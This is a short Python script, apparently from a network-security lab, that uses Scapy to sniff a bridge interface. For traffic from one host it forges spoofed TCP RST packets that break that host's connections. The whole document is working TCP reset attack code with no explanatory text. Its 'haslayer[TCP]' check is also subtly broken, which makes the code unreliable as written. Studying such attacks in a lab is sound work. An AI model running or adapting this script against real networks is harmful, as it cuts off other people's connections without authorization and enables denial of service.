from scapy.all import TCP, IP, send, sniff

def packet_extract(packet):
    user1_ip = packet[IP].src
    victim_ip = packet[IP].dst
    user1_port = packet[TCP].sport
    victim_port = packet[TCP].dport
    acknowledge = packet[TCP].ack
    sequence = packet[TCP].seq

    if packet.haslayer[TCP] and user1_ip == '192.168.60.3':
        reset_ip = IP(src = victim_ip, dst = user1_ip)
        reset_tcp = TCP(sport = victim_port,
                        dport = user1_port,
                        flags = 'R',
                        seq = acknowledge)
        reset_packet = reset_ip / reset_tcp
        reset_packet.show()
        send(reset_packet, verbose = 0)

sniff(iface = 'br-b63fe27dcce0', prn = packet_extract)